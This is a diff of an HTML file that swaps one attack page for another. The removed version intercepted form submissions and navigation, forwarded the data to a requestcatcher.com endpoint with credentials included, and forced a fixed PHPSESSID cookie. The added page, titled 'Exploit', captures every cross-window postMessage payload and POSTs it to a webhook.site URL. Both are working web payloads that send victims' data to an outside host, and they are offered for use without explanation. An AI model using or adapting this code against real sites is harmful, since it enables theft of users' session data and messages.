@@ -1,80 +1,17 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Request Duplicator</title>
-    <script>
-        // Function to duplicate the current request to the target URL
-        function duplicateRequest(event) {
-            // Prevent default form submission if it's a form
-            if (event && event.preventDefault) {
-                event.preventDefault();
-            }
-
-            // Get current URL and method
-            const currentUrl = window.location.href;
-            const method = event && event.type === 'submit' ? 'POST' : 'GET';
-
-            // Prepare fetch options
-            const fetchOptions = {
-                method: method,
-                mode: 'no-cors', // Important for cross-origin requests
-                credentials: 'include', // Ensures cookies are sent
-                headers: {
-                    'Cookie': 'PHPSESSID=aklljdlak' // Set the specific PHPSESSID
-                }
-            };
-
-            // Only add body if it's a form submission and the target is a form
-            if (event && event.target && event.target instanceof HTMLFormElement) {
-                fetchOptions.body = new FormData(event.target);
-            }
-
-            // Send request to RequestCatcher
-            fetch('https://noproblem.requestcatcher.com/', fetchOptions)
-                .catch(error => {
-                    console.error('Error duplicating request:', error);
-                });
-
-            // Set the cookie for the current page as well
-            document.cookie = 'PHPSESSID=aklljdlak; path=/';
-
-            // Optional: Also allow original request to proceed
-            return true;
-        }
-
-        // Intercept all form submissions
-        document.addEventListener('DOMContentLoaded', () => {
-            document.addEventListener('submit', duplicateRequest);
-        });
-
-        // Capture all types of navigation
-        window.addEventListener('popstate', duplicateRequest);
-
-        // Override default navigation methods to capture requests
-        (function(history){
-            const pushState = history.pushState;
-            const replaceState = history.replaceState;
-
-            history.pushState = function() {
-                const result = pushState.apply(history, arguments);
-                duplicateRequest();
-                return result;
-            };
-
-            history.replaceState = function() {
-                const result = replaceState.apply(history, arguments);
-                duplicateRequest();
-                return result;
-            };
-        })(window.history);
-
-        // Duplicate initial page load
-        window.addEventListener('load', duplicateRequest);
-    </script>
+    <title>Exploit</title>
 </head>
 <body>
-    <h1>Request Duplicator</h1>
-    <p>All requests to this page will be duplicated to https://noproblem.requestcatcher.com/ with PHPSESSID=aklljdlak</p>
+    <script>
+    window.addEventListener('message', function(e) {
+        // Send the data to our webhook
+        fetch('https://webhook.site/460b0cb8-1ee1-48f6-8a83-61ffb529d2ec', {
+            method: 'POST',
+            body: e.data
+        });
+    });
+    </script>
 </body>
 </html>
